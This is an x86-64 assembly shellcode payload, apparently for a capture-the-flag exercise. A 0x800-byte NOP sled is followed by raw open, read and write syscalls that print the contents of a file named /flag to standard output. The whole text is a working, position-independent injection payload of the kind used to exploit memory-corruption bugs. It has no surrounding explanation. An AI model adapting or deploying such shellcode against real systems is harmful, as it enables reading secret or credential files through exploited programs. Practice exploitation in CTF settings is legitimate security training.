section .text
global _start

_start:
	times 0x800 nop		; generate 0x800 nop instructions

	; Open /flag
	mov rax, 2		; sys_open
	lea rdi, [rel flag]	; filename (position-independent)
	mov rsi, 0		; flags (O_RDONLY)
	mov rdx, 0		; mode (ignored)
	syscall

	; Read file
	mov rdi, rax		; file descriptor from open
	mov rax, 0		; sys_read
	lea rsi, [rel buf]	; buffer (position-independent)
	mov rdx, 100		; read up to 100 bytes
	syscall

	; Write file
        mov rdx, rax            ; number of bytes 
        mov rax, 1              ; sys_write
	mov rdi, 1		; stdout file descriptor
        lea rsi, [rel buf]   ; buffer (position-independent)
        syscall

	; Exit
	mov rax, 60		; sys_exit
	mov rdi, 0		; exit code
	syscall

flag:
	db "/flag", 0
buf:
	times 100 db 0
